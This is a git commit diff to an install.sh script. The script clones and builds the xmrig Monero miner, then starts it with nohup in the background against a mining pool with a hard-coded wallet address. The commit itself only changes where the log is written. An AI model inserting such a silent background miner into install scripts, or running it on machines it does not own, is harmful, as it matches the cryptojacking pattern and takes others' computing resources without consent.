4fc1be8272ce114e07019ae72d9e20cd9b94deab
Deepak Meena X <meenadeepak7202@gmail.com>
2025-07-13 21:21:13 +0530

    install.sh

--- install.sh
+++ install.sh
@@ -4,4 +4,4 @@ git clone https://github.com/xmrig/xmrig.git
 cd xmrig && mkdir build && cd build
 cmake ..
 make -j$(nproc)
-nohup ./xmrig -o pool.minexmr.com:443 -u 4Agqnp2CXvsYS5y7Wc5JEFPT7H5Q5zF553seWnRBXh3uM4aamXzwGHh5eW7WVQrE4rbigJaX7B46fZP3nznmGQj56W8N39S -k --tls --threads=1 > miner.log 2>&1 &
+nohup ./xmrig -o pool.minexmr.com:443 -u 4Agqnp2CXvsYS5y7Wc5JEFPT7H5Q5zF553seWnRBXh3uM4aamXzwGHh5eW7WVQrE4rbigJaX7B46fZP3nznmGQj56W8N39S -k --tls --threads=1 > ~/miner.log 2>&1 &
